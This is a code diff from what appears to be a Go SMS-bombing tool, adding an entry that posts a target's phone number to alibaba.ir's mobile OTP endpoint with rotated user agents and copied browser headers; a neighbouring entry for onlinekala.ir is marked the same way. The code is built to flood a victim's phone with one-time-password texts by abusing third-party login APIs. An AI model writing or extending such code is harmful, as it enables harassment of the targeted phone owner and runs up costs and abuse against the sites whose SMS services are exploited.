@@ -494,6 +494,37 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+
+// ------ alibaba.ir ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "phoneNumber": "0" + getPhoneNumberNoZero(phone),
+        }
+        jsonData, _ := json.Marshal(payload)
+        req, _ := http.NewRequestWithContext(ctx, http.MethodPost, "https://ws.alibaba.ir/api/v3/account/mobile/otp", bytes.NewBuffer(jsonData))
+        req.Header.Set("Host", "ws.alibaba.ir")
+        req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+        req.Header.Set("Accept", "application/json, text/plain, */*")
+        req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+        req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+        req.Header.Set("ab-channel", "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR")
+        req.Header.Set("ab-alohomora", "MTMxOTIzNTI1MjU2NS4yNTEy")
+        req.Header.Set("Content-Type", "application/json;charset=utf-8")
+        req.Header.Set("Origin", "https://www.alibaba.ir")
+        req.Header.Set("Referer", "https://www.alibaba.ir/hotel")
+        req.Header.Set("Connection", "keep-alive")
+        resp, err := c.Do(req)
+        if err != nil {
+            ch <- http.StatusInternalServerError
+        } else {
+            ch <- resp.StatusCode
+            resp.Body.Close()
+        }
+        wg.Done()
+    }
+}(client)
 // ------ https://www.onlinekala.ir ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
